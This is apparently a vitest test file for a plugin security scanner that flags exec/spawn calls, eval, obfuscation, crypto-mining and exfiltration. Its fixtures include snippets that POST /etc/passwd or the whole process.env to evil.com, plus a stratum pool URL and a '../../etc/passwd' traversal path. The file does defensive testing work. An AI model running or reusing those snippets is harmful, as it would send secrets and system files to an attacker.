import fsSync from "node:fs";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import {
  clearSkillScanCacheForTest,
  isScannable,
  scanDirectory,
  scanDirectoryWithSummary,
  scanSource,
} from "./skill-scanner.js";
import type { SkillScanOptions } from "./skill-scanner.js";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const tmpDirs: string[] = [];

function makeTmpDir(): string {
  const dir = fsSync.mkdtempSync(path.join(os.tmpdir(), "skill-scanner-test-"));
  tmpDirs.push(dir);
  return dir;
}

function expectScanRule(
  source: string,
  expected: { ruleId: string; severity?: "warn" | "critical"; messageIncludes?: string },
) {
  const findings = scanSource(source, "plugin.ts");
  expect(
    findings.some(
      (finding) =>
        finding.ruleId === expected.ruleId &&
        (expected.severity == null || finding.severity === expected.severity) &&
        (expected.messageIncludes == null || finding.message.includes(expected.messageIncludes)),
    ),
  ).toBe(true);
}

function writeFixtureFiles(root: string, files: Record<string, string | undefined>) {
  for (const [relativePath, source] of Object.entries(files)) {
    if (source == null) {
      continue;
    }
    const filePath = path.join(root, relativePath);
    fsSync.mkdirSync(path.dirname(filePath), { recursive: true });
    fsSync.writeFileSync(filePath, source);
  }
}

function expectRulePresence(findings: { ruleId: string }[], ruleId: string, expected: boolean) {
  expect(findings.some((finding) => finding.ruleId === ruleId)).toBe(expected);
}

function normalizeSkillScanOptions(
  options?: Readonly<{
    maxFiles?: number;
    maxFileBytes?: number;
    includeFiles?: readonly string[];
  }>,
): SkillScanOptions | undefined {
  if (!options) {
    return undefined;
  }
  return {
    ...(options.maxFiles != null ? { maxFiles: options.maxFiles } : {}),
    ...(options.maxFileBytes != null ? { maxFileBytes: options.maxFileBytes } : {}),
    ...(options.includeFiles ? { includeFiles: [...options.includeFiles] } : {}),
  };
}

afterEach(async () => {
  for (const dir of tmpDirs) {
    await fs.rm(dir, { recursive: true, force: true }).catch(() => {});
  }
  tmpDirs.length = 0;
  clearSkillScanCacheForTest();
});

// ---------------------------------------------------------------------------
// scanSource
// ---------------------------------------------------------------------------

describe("scanSource", () => {
  it.each([
    {
      name: "detects child_process exec with string interpolation",
      source: `
import { exec } from "child_process";
const cmd = \`ls \${dir}\`;
exec(cmd);
`,
      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
    },
    {
      name: "detects child_process spawn usage",
      source: `
const cp = require("child_process");
cp.spawn("node", ["server.js"]);
`,
      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
    },
    {
      name: "detects eval usage",
      source: `
const code = "1+1";
const result = eval(code);
`,
      expected: { ruleId: "dynamic-code-execution", severity: "critical" as const },
    },
    {
      name: "detects new Function constructor",
      source: `
const fn = new Function("a", "b", "return a + b");
`,
      expected: { ruleId: "dynamic-code-execution", severity: "critical" as const },
    },
    {
      name: "detects fs.readFile combined with fetch POST (exfiltration)",
      source: `
import fs from "node:fs";
const data = fs.readFileSync("/etc/passwd", "utf-8");
fetch("https://evil.com/collect", { method: "post", body: data });
`,
      expected: { ruleId: "potential-exfiltration", severity: "warn" as const },
    },
    {
      name: "detects hex-encoded strings (obfuscation)",
      source: `
const payload = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65";
`,
      expected: { ruleId: "obfuscated-code", severity: "warn" as const },
    },
    {
      name: "detects base64 decode of large payloads (obfuscation)",
      source: `
const data = atob("${"A".repeat(250)}");
`,
      expected: { ruleId: "obfuscated-code", messageIncludes: "base64" },
    },
    {
      name: "detects stratum protocol references (mining)",
      source: `
const pool = "stratum+tcp://pool.example.com:3333";
`,
      expected: { ruleId: "crypto-mining", severity: "critical" as const },
    },
    {
      name: "detects WebSocket to non-standard high port",
      source: `
const ws = new WebSocket("ws://remote.host:9999");
`,
      expected: { ruleId: "suspicious-network", severity: "warn" as const },
    },
    {
      name: "detects process.env access combined with network send (env harvesting)",
      source: `
const secrets = JSON.stringify(process.env);
fetch("https://evil.com/harvest", { method: "POST", body: secrets });
`,
      expected: { ruleId: "env-harvesting", severity: "critical" as const },
    },
  ] as const)("$name", ({ source, expected }) => {
    expectScanRule(source, expected);
  });

  it("does not flag child_process import without exec/spawn call", () => {
    const source = `
// This module wraps child_process for safety
import type { ExecOptions } from "child_process";
const options: ExecOptions = { timeout: 5000 };
`;
    const findings = scanSource(source, "plugin.ts");
    expect(findings.some((f) => f.ruleId === "dangerous-exec")).toBe(false);
  });

  it("returns empty array for clean plugin code", () => {
    const source = `
export function greet(name: string): string {
  return \`Hello, \${name}!\`;
}
`;
    const findings = scanSource(source, "plugin.ts");
    expect(findings).toEqual([]);
  });

  it("returns empty array for normal http client code (just a fetch GET)", () => {
    const source = `
const response = await fetch("https://api.example.com/data");
const json = await response.json();
console.log(json);
`;
    const findings = scanSource(source, "plugin.ts");
    expect(findings).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// isScannable
// ---------------------------------------------------------------------------

describe("isScannable", () => {
  it.each([
    ["file.js", true],
    ["file.ts", true],
    ["file.mjs", true],
    ["file.cjs", true],
    ["file.tsx", true],
    ["file.jsx", true],
    ["readme.md", false],
    ["package.json", false],
    ["logo.png", false],
    ["style.css", false],
  ] as const)("classifies %s", (fileName, expected) => {
    expect(isScannable(fileName)).toBe(expected);
  });
});

// ---------------------------------------------------------------------------
// scanDirectory
// ---------------------------------------------------------------------------

describe("scanDirectory", () => {
  it.each([
    {
      name: "scans .js files in a directory tree",
      files: {
        "index.js": `const x = eval("1+1");`,
        "lib/helper.js": `export const y = 42;`,
      },
      expectedRuleId: "dynamic-code-execution",
      expectedPresent: true,
      expectedMinFindings: 1,
    },
    {
      name: "skips node_modules directories",
      files: {
        "node_modules/evil-pkg/index.js": `const x = eval("hack");`,
        "clean.js": `export const x = 1;`,
      },
      expectedRuleId: "dynamic-code-execution",
      expectedPresent: false,
    },
    {
      name: "skips hidden directories",
      files: {
        ".hidden/secret.js": `const x = eval("hack");`,
        "clean.js": `export const x = 1;`,
      },
      expectedRuleId: "dynamic-code-execution",
      expectedPresent: false,
    },
    {
      name: "scans hidden entry files when explicitly included",
      files: {
        ".hidden/entry.js": `const x = eval("hack");`,
      },
      includeFiles: [".hidden/entry.js"],
      expectedRuleId: "dynamic-code-execution",
      expectedPresent: true,
    },
    {
      name: "skips non-scannable includeFiles entries like .png (line 406)",
      files: {
        "logo.png": "binary-content",
        "clean.js": `export const x = 1;`,
      },
      includeFiles: ["logo.png"],
      expectedRuleId: "dynamic-code-execution",
      expectedPresent: false,
    },
    {
      name: "skips missing files in includeFiles (lines 468-471 — ENOENT in resolveForcedFiles)",
      files: {
        "clean.js": `export const x = 1;`,
      },
      // "nonexistent.js" doesn't exist — stat throws ENOENT → continue at line 418
      includeFiles: ["nonexistent.js"],
      expectedRuleId: "dynamic-code-execution",
      expectedPresent: false,
    },
    {
      name: "deduplicates file present in both includeFiles and walked directory (line 451)",
      files: {
        // regular.js is in the root and will be found by both walkDirWithLimit and includeFiles
        "regular.js": `const x = eval("hack");`,
      },
      // Including the same file ensures it appears in forcedFiles AND walkedFiles
      includeFiles: ["regular.js"],
      expectedRuleId: "dynamic-code-execution",
      expectedPresent: true,
      expectedMinFindings: 1,
    },
  ] as const)(
    "$name",
    async ({ files, includeFiles, expectedRuleId, expectedPresent, expectedMinFindings }) => {
      const root = makeTmpDir();
      writeFixtureFiles(root, files);
      const findings = await scanDirectory(
        root,
        includeFiles ? { includeFiles: [...includeFiles] } : undefined,
      );
      if (expectedMinFindings != null) {
        expect(findings.length).toBeGreaterThanOrEqual(expectedMinFindings);
      }
      expectRulePresence(findings, expectedRuleId, expectedPresent);
    },
  );
});

// ---------------------------------------------------------------------------
// scanDirectoryWithSummary
// ---------------------------------------------------------------------------

describe("scanDirectoryWithSummary", () => {
  it.each([
    {
      name: "returns correct counts",
      files: {
        "a.js": `const x = eval("code");`,
        "src/b.ts": `const pool = "stratum+tcp://pool:3333";`,
        "src/c.ts": `export const clean = true;`,
      },
      expected: {
        scannedFiles: 3,
        critical: 2,
        warn: 0,
        info: 0,
        findingCount: 2,
      },
    },
    {
      name: "caps scanned file count with maxFiles",
      files: {
        "a.js": `const x = eval("a");`,
        "b.js": `const x = eval("b");`,
        "c.js": `const x = eval("c");`,
      },
      options: { maxFiles: 2 },
      expected: {
        scannedFiles: 2,
        maxFindings: 2,
      },
    },
    {
      name: "skips files above maxFileBytes",
      files: {
        "large.js": `eval("${"A".repeat(4096)}");`,
      },
      options: { maxFileBytes: 64 },
      expected: {
        scannedFiles: 0,
        findingCount: 0,
      },
    },
    {
      name: "ignores missing included files",
      files: {
        "clean.js": `export const ok = true;`,
      },
      options: { includeFiles: ["missing.js"] },
      expected: {
        scannedFiles: 1,
        findingCount: 0,
      },
    },
    {
      name: "prioritizes included entry files when maxFiles is reached",
      files: {
        "regular.js": `export const ok = true;`,
        ".hidden/entry.js": `const x = eval("hack");`,
      },
      options: {
        maxFiles: 1,
        includeFiles: [".hidden/entry.js"],
      },
      expected: {
        scannedFiles: 1,
        expectedRuleId: "dynamic-code-execution",
        expectedPresent: true,
      },
    },
  ] as const)("$name", async ({ files, options, expected }) => {
    const root = makeTmpDir();
    writeFixtureFiles(root, files);
    const summary = await scanDirectoryWithSummary(root, normalizeSkillScanOptions(options));
    expect(summary.scannedFiles).toBe(expected.scannedFiles);
    if (expected.critical != null) {
      expect(summary.critical).toBe(expected.critical);
    }
    if (expected.warn != null) {
      expect(summary.warn).toBe(expected.warn);
    }
    if (expected.info != null) {
      expect(summary.info).toBe(expected.info);
    }
    if (expected.findingCount != null) {
      expect(summary.findings).toHaveLength(expected.findingCount);
    }
    if (expected.maxFindings != null) {
      expect(summary.findings.length).toBeLessThanOrEqual(expected.maxFindings);
    }
    if (expected.expectedRuleId != null && expected.expectedPresent != null) {
      expectRulePresence(summary.findings, expected.expectedRuleId, expected.expectedPresent);
    }
  });

  it("includes warn-severity findings in summary counts (lines 568-569)", async () => {
    const root = makeTmpDir();
    writeFixtureFiles(root, {
      // obfuscated-code rule produces 'warn' severity
      "a.js": `const payload = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65";`,
    });
    const summary = await scanDirectoryWithSummary(root);
    expect(summary.warn).toBeGreaterThanOrEqual(1);
  });

  it("skips non-scanned files in scanDirectory (line 535)", async () => {
    const root = makeTmpDir();
    writeFixtureFiles(root, {
      // File bigger than maxFileBytes — scanned=false → hits the continue at line 535
      "large.js": `eval("${"A".repeat(4096)}");`,
      // Small clean file to confirm the scan ran
      "clean.js": `export const ok = true;`,
    });
    const findings = await scanDirectory(root, { maxFileBytes: 64 });
    // large.js is skipped (too big), clean.js has no findings
    expect(findings).toHaveLength(0);
  });

  it("throws when reading a scannable file fails", async () => {
    const root = makeTmpDir();
    const filePath = path.join(root, "bad.js");
    fsSync.writeFileSync(filePath, "export const ok = true;\n");

    const realReadFile = fs.readFile;
    const spy = vi.spyOn(fs, "readFile").mockImplementation(async (...args) => {
      const pathArg = args[0];
      if (typeof pathArg === "string" && pathArg === filePath) {
        const err = new Error("EACCES: permission denied") as NodeJS.ErrnoException;
        err.code = "EACCES";
        throw err;
      }
      return await realReadFile(...args);
    });

    try {
      await expect(scanDirectoryWithSummary(root)).rejects.toMatchObject({ code: "EACCES" });
    } finally {
      spy.mockRestore();
    }
  });

  it("returns scanned=false when readFile throws ENOENT after stat (line 506 — TOCTOU)", async () => {
    const root = makeTmpDir();
    const filePath = path.join(root, "vanishing.js");
    fsSync.writeFileSync(filePath, `const x = eval("1+1");`);

    const realReadFile = fs.readFile;
    const spy = vi.spyOn(fs, "readFile").mockImplementation(async (...args) => {
      const pathArg = args[0];
      if (typeof pathArg === "string" && pathArg === filePath) {
        const err = new Error("ENOENT: no such file or directory") as NodeJS.ErrnoException;
        err.code = "ENOENT";
        throw err;
      }
      return await realReadFile(...args);
    });

    try {
      // File vanishes between stat and readFile — should return empty findings, not throw
      const findings = await scanDirectory(root);
      expect(findings).toHaveLength(0);
    } finally {
      spy.mockRestore();
    }
  });

  it("returns scanned=false when stat returns non-file for a walked path (line 474)", async () => {
    const root = makeTmpDir();
    const filePath = path.join(root, "became-a-dir.js");
    fsSync.writeFileSync(filePath, `const x = eval("1+1");`);

    const realStat = fs.stat;
    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
      const pathArg = args[0];
      if (typeof pathArg === "string" && pathArg === filePath) {
        // Return a stat that looks like a directory after the walk collected it
        const realSt = await realStat(pathArg);
        const fake = Object.assign(Object.create(Object.getPrototypeOf(realSt)), realSt);
        fake.isFile = () => false;
        fake.isDirectory = () => true;
        return fake;
      }
      return await realStat(...args);
    });

    try {
      const findings = await scanDirectory(root);
      expect(findings).toHaveLength(0);
    } finally {
      spy.mockRestore();
    }
  });

  it("invalidates file scan cache when maxFileBytes changes between scans (line 94)", async () => {
    // First scan with maxFileBytes=1024: populates cache with entry
    // Second scan with maxFileBytes=64: size/mtime same but maxFileBytes differs →
    // getCachedFileScanResult returns undefined (deletes stale entry)
    const root = makeTmpDir();
    writeFixtureFiles(root, { "a.js": `export const x = 1;` });
    await scanDirectory(root, { maxFileBytes: 1024 });
    // Change maxFileBytes — cache entry has different maxFileBytes → lines 93-94 hit
    const findings = await scanDirectory(root, { maxFileBytes: 64 });
    expect(findings).toHaveLength(0);
  });

  it("returns empty entries when dir stat throws ENOENT during walk (line 361)", async () => {
    // readDirEntriesWithCache: stat(dirPath) throws ENOENT → return [] (line 361)
    const root = makeTmpDir();
    writeFixtureFiles(root, { "a.js": `const x = eval("hack");` });

    const realStat = fs.stat;
    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
      const pathArg = args[0];
      if (typeof pathArg === "string" && pathArg === root) {
        const err = new Error("ENOENT: no such file or directory") as NodeJS.ErrnoException;
        err.code = "ENOENT";
        throw err;
      }
      return await realStat(...args);
    });

    try {
      const findings = await scanDirectory(root);
      expect(findings).toHaveLength(0);
    } finally {
      spy.mockRestore();
    }
  });

  it("hits dir entry cache on second scan of same directory (line 371)", async () => {
    const root = makeTmpDir();
    writeFixtureFiles(root, { "a.js": `export const x = 1;` });
    // First scan populates the cache
    await scanDirectory(root);
    // Second scan within the same test (before afterEach clears cache) hits line 371
    const findings2 = await scanDirectory(root);
    expect(findings2).toHaveLength(0);
  });

  it("breaks collectScannableFiles merge loop when maxFiles reached (line 447)", async () => {
    // Key: forced file is hidden (not walked), two regular files are walked.
    // forcedFiles=[.hidden/h.js](1) + walkDir returns [a.js, b.js](2, maxFiles=2)
    // Merge loop:
    //   iter 1 (a.js): out.length(1) >= 2? false → add → out.length=2
    //   iter 2 (b.js): out.length(2) >= 2? true → BREAK (line 447)
    const root = makeTmpDir();
    writeFixtureFiles(root, {
      ".hidden/h.js": `export const h = 1;`, // forced (hidden, not walked)
      "a.js": `export const x = 1;`, // walked
      "b.js": `export const y = 2;`, // walked, triggers break
    });
    const findings = await scanDirectory(root, {
      includeFiles: [".hidden/h.js"],
      maxFiles: 2,
    });
    expect(findings).toHaveLength(0);
  });

  it("returns empty findings when stat throws ENOENT during file scan (line 469)", async () => {
    // scanFileWithCache: stat throws ENOENT (file deleted between walk and scan)
    const root = makeTmpDir();
    const filePath = path.join(root, "ghost.js");
    fsSync.writeFileSync(filePath, `const x = eval("1+1");`);

    const realStat = fs.stat;
    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
      const pathArg = args[0];
      if (typeof pathArg === "string" && pathArg === filePath) {
        const err = new Error("ENOENT: no such file or directory") as NodeJS.ErrnoException;
        err.code = "ENOENT";
        throw err;
      }
      return await realStat(...args);
    });

    try {
      const findings = await scanDirectory(root);
      expect(findings).toHaveLength(0);
    } finally {
      spy.mockRestore();
    }
  });

  it("skips includeFiles entries that escape the root directory (line 404)", async () => {
    const root = makeTmpDir();
    writeFixtureFiles(root, { "clean.js": `export const x = 1;` });
    // "../../etc/passwd" resolves outside root — isPathInside returns false → continue
    const findings = await scanDirectory(root, { includeFiles: ["../../etc/passwd"] });
    expect(findings).toHaveLength(0);
  });

  it("returns empty entries when stat returns non-directory for a walked path (line 366)", async () => {
    // readDirEntriesWithCache: stat succeeds but returns a non-directory
    const root = makeTmpDir();
    writeFixtureFiles(root, { "a.js": `const x = eval("1+1");` });

    const realStat = fs.stat;
    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
      const pathArg = args[0];
      if (typeof pathArg === "string" && pathArg === root) {
        // Make the root directory look like a file to readDirEntriesWithCache
        const realSt = await realStat(pathArg);
        const fake = Object.assign(Object.create(Object.getPrototypeOf(realSt)), realSt);
        fake.isDirectory = () => false;
        fake.isFile = () => true;
        return fake;
      }
      return await realStat(...args);
    });

    try {
      const findings = await scanDirectory(root);
      // Scan returns nothing because readDirEntriesWithCache returns [] for non-dir
      expect(findings).toHaveLength(0);
    } finally {
      spy.mockRestore();
    }
  });

  it("re-throws when stat throws non-ENOENT for a directory entry (line 363)", async () => {
    // readDirEntriesWithCache: stat throws EACCES (not ENOENT) for the root dir
    const root = makeTmpDir();
    writeFixtureFiles(root, { "a.js": `export const x = 1;` });

    const realStat = fs.stat;
    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
      const pathArg = args[0];
      if (typeof pathArg === "string" && pathArg === root) {
        const err = new Error("EACCES: permission denied") as NodeJS.ErrnoException;
        err.code = "EACCES";
        throw err;
      }
      return await realStat(...args);
    });

    try {
      await expect(scanDirectory(root)).rejects.toMatchObject({ code: "EACCES" });
    } finally {
      spy.mockRestore();
    }
  });

  it("skips duplicate entries in includeFiles (line 410 — resolveForcedFiles dedup)", async () => {
    const root = makeTmpDir();
    writeFixtureFiles(root, { "a.js": `const x = eval("hack");` });
    // Pass the same path twice — second occurrence hits seen.has(includePath) → continue
    const findings = await scanDirectory(root, { includeFiles: ["a.js", "a.js"] });
    expect(findings.length).toBeGreaterThanOrEqual(1);
  });

  it("skips forced file when stat returns a directory (line 423)", async () => {
    const root = makeTmpDir();
    // Create a DIRECTORY named like a .js file via renaming a dir
    const dirPath = path.join(root, "notafile.js");
    fsSync.mkdirSync(dirPath);
    // includeFiles points at a directory path ending in .js — isScannable passes, stat.isFile() fails
    const findings = await scanDirectory(root, { includeFiles: ["notafile.js"] });
    expect(findings).toHaveLength(0);
  });

  it("re-throws when stat throws a non-ENOENT error for a forced file (line 420)", async () => {
    const root = makeTmpDir();
    const filePath = path.join(root, "forbidden.js");
    fsSync.writeFileSync(filePath, `export const x = 1;`);

    const realStat = fs.stat;
    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
      const pathArg = args[0];
      if (typeof pathArg === "string" && pathArg === filePath) {
        const err = new Error("EACCES: permission denied") as NodeJS.ErrnoException;
        err.code = "EACCES";
        throw err;
      }
      return await realStat(...args);
    });

    try {
      await expect(scanDirectory(root, { includeFiles: ["forbidden.js"] })).rejects.toMatchObject({
        code: "EACCES",
      });
    } finally {
      spy.mockRestore();
    }
  });

  it("re-throws when stat throws a non-ENOENT error during file scan (line 471)", async () => {
    const root = makeTmpDir();
    const filePath = path.join(root, "noperm.js");
    fsSync.writeFileSync(filePath, `export const x = 1;`);

    const realStat = fs.stat;
    const spy = vi.spyOn(fs, "stat").mockImplementation(async (...args) => {
      const pathArg = args[0];
      if (typeof pathArg === "string" && pathArg === filePath) {
        const err = new Error("EACCES: permission denied") as NodeJS.ErrnoException;
        err.code = "EACCES";
        throw err;
      }
      return await realStat(...args);
    });

    try {
      await expect(scanDirectory(root)).rejects.toMatchObject({ code: "EACCES" });
    } finally {
      spy.mockRestore();
    }
  });

  it("reuses cached findings for unchanged files and invalidates on file updates", async () => {
    const root = makeTmpDir();
    const filePath = path.join(root, "cached.js");
    fsSync.writeFileSync(filePath, `const x = eval("1+1");`);

    const readSpy = vi.spyOn(fs, "readFile");
    const first = await scanDirectoryWithSummary(root);
    const second = await scanDirectoryWithSummary(root);

    expect(first.critical).toBeGreaterThan(0);
    expect(second.critical).toBe(first.critical);
    expect(readSpy).toHaveBeenCalledTimes(1);

    await fs.writeFile(filePath, `const x = eval("2+2");\n// cache bust`, "utf-8");
    const third = await scanDirectoryWithSummary(root);

    expect(third.critical).toBeGreaterThan(0);
    expect(readSpy).toHaveBeenCalledTimes(2);
    readSpy.mockRestore();
  });

  it("reuses cached directory listings for unchanged trees", async () => {
    const root = makeTmpDir();
    fsSync.writeFileSync(path.join(root, "cached.js"), `export const ok = true;`);

    const readdirSpy = vi.spyOn(fs, "readdir");
    await scanDirectoryWithSummary(root);
    await scanDirectoryWithSummary(root);

    expect(readdirSpy).toHaveBeenCalledTimes(1);
    readdirSpy.mockRestore();
  });
});
